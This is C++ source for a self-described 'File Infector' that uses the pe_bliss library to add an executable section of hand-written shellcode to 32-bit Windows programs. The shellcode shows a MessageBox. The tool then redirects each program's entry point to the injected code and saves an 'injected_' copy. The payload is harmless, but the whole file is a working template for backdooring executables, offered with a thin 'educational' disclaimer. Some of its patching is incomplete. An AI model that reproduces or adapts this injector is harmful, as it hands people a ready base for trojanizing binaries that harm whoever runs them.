/*
* GNU General Public License v2.0
*
* ############################################################
* #         Program Name: File Infector				         #
* #			Version:	  0.1							     #
* #			Description:  Infects other Executables		     #
* #						  with Hello World Code.		     #
* ############################################################
*
* Copyright (c) 2016 John Smith "0x90"
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.

* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* ###############################################################
* #						  DISCLAIMER:							#
* # The Author is not responsible for any misuse of this code   #
* #			and its written only for educational purposes!      #
* ###############################################################
*/

#include <iostream>
#include <fstream>
#include <pe_bliss.h>
#ifdef PE_BLISS_WINDOWS
#include "lib.h"
#include "main.h"
#endif
#include <basetsd.h>
#include <wtypes.h>
#include <cstring>
#include <string>
#include "pe_base.h"

#define PAUSE system("pause");

using namespace pe_bliss;
using namespace std;

BOOL GetProcAddresses(HINSTANCE *hLibrary, LPCSTR lpszLibrary, INT nCount, ...);

int main(int argc, char* argv[])
{
	fstream pe_file(argv[1], ios::in | ios::binary);

	if (!pe_file)
	{
		//Problems problems problems...
		cout << "[!] PE File Could Not Be Opened!" << endl;
		pe_file.close();

		PAUSE
			return -1;
	}
	else {
		try
		{
			pe_base image(pe_factory::create_pe(pe_file));

			DWORD e_magic		=		image.get_magic();
			DWORD e_machine		=		image.get_machine();
			// Get address for MessageBoxA
			//FARPROC msgBoxAddr = GetProcAddress(GetModuleHandleA("user32.dll"), "MessageBoxA");
			//decltype(MessageBoxA)* msgBoxAddr = (decltype(MessageBoxA)*)GetProcAddress(GetModuleHandle("user32.dll"), "MessageBoxA");

			

			if (image.is_dotnet())
			{
				cout << "[!] Sorry This ain't DnSpy :)" << endl;

				PAUSE
				return 0;
			}
			else {
				if (e_machine != 332) //34404 (0x8664) = x64 Architecture / 332 (0x14c) = x86 Architecture
				{
					puts("[!] File Infector does not process x64 Executables!");

					PAUSE
					return 0;
				}
				else {

					/////////////////////////START LOGO//////////////////////////
					puts("####################################################");
					puts("#                0x90 File Injector                #");
					puts("####################################################");

					//////////////////Read Entrypoints///////////////////////////
					puts("[+] Reading Old Section EP ...");

					// Create image based on PE File
					UINT32 old_va_ep = image.get_ep(); // Get Image Entry Point for Later Redirection

					UINT32 old_rva_oep = old_va_ep + image.get_image_base_32();

					cout << "[+] Old EP: " << showbase << hex << old_va_ep << endl;
					cout << "[+] Old OEP: " << old_rva_oep << endl;

					//unsigned uiImpDir = new_section.get_virtual_address() + 0x100; 

					

					////////////////////ADD NEW SECTION//////////////////////
					section new_section;
					cout << "[+] Adding New Section ..." << endl;

					//Section Name (8 Chars MAX!)
					const char section_name[8] = ".hw";
					char data[] = {
						0x6A, 0x00,							// push	0
						0x68, 0x00, 0xA0, 0x02, 0xE1,		// push "PeBliss"
						0x68, 0x00, 0x00, 0x00, 0x00,		// push "Built with PeBliss"
						0x6A, 0x00,							// push 0
						0xE8, 0x00, 0x00, 0x00, 0x00,		// call MessageBoxA
						0xE9, 0x00, 0x00, 0x00, 0x00,		// JMP to OEP
						'B','u','i','l','t',' ',			// Data String...
						'w','i','t','h',' ',				// ...
						'P','e','B','l','i', 's', 's' };	// ...
					

					// New Section Name (our Hello World section :D)
					new_section.set_name(section_name);

					// Set New Section Permissios as R/E/W
					new_section.readable(true).executable(true).writeable(true);

					// Setting New Section Size
					image.set_section_virtual_size(new_section, 200);

					cout << "[+] Injecting Data to PE ..." << endl;


					UINT32 rawDataOffset = new_section.get_pointer_to_raw_data();

					*(UINT32*)(&data[3]) = image.rva_from_section_offset(new_section, 35);
					*(UINT32*)(&data[8]) = image.rva_from_section_offset(new_section, 24);
					UINT32 *pointer = (UINT32*)&MessageBoxA;
					cout << "MessageBox Address: " << pointer << endl;
					*(UINT32*)&data[15] = *(UINT32*)&pointer;

					/////////////////////////////////////////////////////////////////////////////////////
					// http://stackoverflow.com/questions/8510239/0x00-and-char-arrays/8510323#8510323 //
					/////////////////////////////////////////////////////////////////////////////////////
					// As we write the stuff to the section, if the writter see it's null terminated 0x00,
					// There was a "bug" where it wouldn't write all the way and it would just stop,
					// thus assuming our Push 0 = "0x6A, 0x00" <- was null-terminated.
					string vData(data, data + sizeof(data) / sizeof(data[0]));
					///////////////////////////////////////////////////////////

					// Write data to our image
					new_section.set_raw_data(vData);

					//Update everything.
					image.update_image_size();

					// This has to be called before adding a new section.
					image.prepare_section(new_section);

					// Finally Adding our Section.
					image.add_section(new_section);

					cout << "[+] New Section Added to the Image!" << endl;

					//////////////////REDIRECTING OEP//////////////////////////////
					cout << "[+] Redirecting Section EP ..." << endl;

					// New way of getting last section (.back()), first section (.front())
					section last_section = image.get_image_sections().back();
					////////////////////////////////////////////////////////////////////

					UINT32 last_section_va = image.rva_to_va_32(last_section.get_virtual_address());
					UINT32 new_va_ep = last_section.get_virtual_address();
					UINT32 new_rva_oep = image.get_image_base_32() + new_va_ep;

					cout << "[+] New EP: " << new_va_ep << endl;
					cout << "[+] New OEP: " << new_rva_oep << endl;

					image.set_ep(new_va_ep);

					///////////////////////GENERATING NEW PE///////////////////////////////////

					//Create new PE file
					//Get the name of original file without directory
					string base_file_name(argv[1]);
					//string ext(base_file_name.substr(base_file_name.length() - 3, 3));
					string file_extension(".exe");
					string dir_name;
					string::size_type slash_pos;
					if ((slash_pos = base_file_name.find_last_of("/\\")) != string::npos)
					{
						dir_name = base_file_name.substr(0, slash_pos + 1); //Source file directory
						base_file_name = base_file_name.substr(slash_pos + 1); //Source file name
					}

					//Give a name to a new file.
					//Concatenate it with original directory name to save it to a folder where
					//original file is stored
					base_file_name = dir_name + "injected_" + base_file_name;
					//Create file
					fstream new_pe_file(base_file_name.c_str(), ios::out | ios::binary | ios::trunc);
					if (!new_pe_file)
					{
						//If failed to create file - display an error message
						cout << "[!] Could Not Create: " << base_file_name << endl;
						return -1;
					}

					//Rebuild PE image
					//Strip DOS header, writing NT headers over it
					//(second parameter (true) is responsible for this)
					//Do not recalculate SizeOfHeaders - third parameter is responsible for this
					rebuild_pe(image, new_pe_file, true, false);

					//Message user that file is successfully packed
					cout << "[+] New File Saved to: " << base_file_name << endl;

					new_pe_file.close();
					pe_file.close();

					PAUSE
					return 0;
				}
			}
		}
		catch (const exception& e)
		{
			//Woops? Something wrong?
			cout << e.what() << endl;

			PAUSE
				return 0;
		}
	}
	//FINISHED YAY!
	pe_file.close();
	PAUSE
	return 0;
}

BOOL GetProcAddresses(HINSTANCE *hLibrary,
	LPCSTR lpszLibrary, INT nCount, ...)
{
	va_list va;
	va_start(va, nCount);

	if ((*hLibrary = LoadLibrary(lpszLibrary))
		!= NULL)
	{
		FARPROC * lpfProcFunction = NULL;
		LPSTR lpszFuncName = NULL;
		INT nIdxCount = 0;
		while (nIdxCount < nCount)
		{
			lpfProcFunction = va_arg(va, FARPROC*);
			lpszFuncName = va_arg(va, LPSTR);
			if ((*lpfProcFunction =
				GetProcAddress(*hLibrary,
					lpszFuncName)) == NULL)
			{
				lpfProcFunction = NULL;
				return FALSE;
			}
			nIdxCount++;
		}
	}
	else
	{
		va_end(va);
		return FALSE;
	}
	va_end(va);
	return TRUE;
}